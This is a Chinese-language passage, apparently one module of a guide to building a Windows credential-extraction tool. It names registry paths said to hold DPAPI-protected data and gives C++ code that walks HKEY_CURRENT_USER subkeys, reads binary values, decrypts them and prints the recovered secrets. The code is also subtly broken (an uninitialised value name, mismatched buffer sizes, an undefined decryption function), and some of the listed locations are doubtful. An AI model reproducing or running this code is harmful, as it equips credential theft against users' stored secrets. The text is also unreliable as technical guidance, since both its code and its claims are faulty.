### 2. **注册表数据提取模块**

- **访问注册表键值**
- **识别 DPAPI 加密的注册表数据**（通常在以下位置）：
  - `HKEY_CURRENT_USER\Software\Microsoft\ProtectedData`
  - `HKEY_CURRENT_USER\Software\Microsoft\Credentials`
  - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections`

```cpp
#include <windows.h>
#include <iostream>

void ExtractEncryptedDataFromRegistry() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\ProtectedData", 0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key.\n";
        return;
    }

    wchar_t subKeyName[256];
    DWORD subKeySize = sizeof(subKeyName);
    DWORD index = 0;

    while (RegEnumKeyEx(hKey, index++, subKeyName, &subKeySize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        std::wcout << L"Found subkey: " << subKeyName << std::endl;

        HKEY subKey;
        RegOpenKeyEx(hKey, subKeyName, 0, KEY_READ, &subKey);

        wchar_t valueName[256];
        DWORD valueNameSize = sizeof(valueName);
        DWORD type;
        DWORD dataSize = 0;
        RegQueryValueEx(subKey, valueName, NULL, &type, NULL, &dataSize);

        if (type == REG_BINARY && dataSize > 0) {
            LPBYTE pData = new BYTE[dataSize];
            RegQueryValueEx(subKey, valueName, NULL, &type, (LPBYTE)pData, &dataSize);

            // Now call DecryptDataWithDPAPI on pData
            LPBYTE pDecrypted;
            DWORD decryptedSize = 0;
            HRESULT hr = DecryptDataWithDPAPI(pData, dataSize, &pDecrypted, &decryptedSize);
            if (SUCCEEDED(hr)) {
                std::cout << "Decrypted data: " << std::string((char*)pDecrypted, decryptedSize) << std::endl;
            } else {
                std::cerr << "Decryption failed.\n";
            }

            delete[] pData;
        }

        RegCloseKey(subKey);
        subKeySize = sizeof(subKeyName);
    }

    RegCloseKey(hKey);
}
```

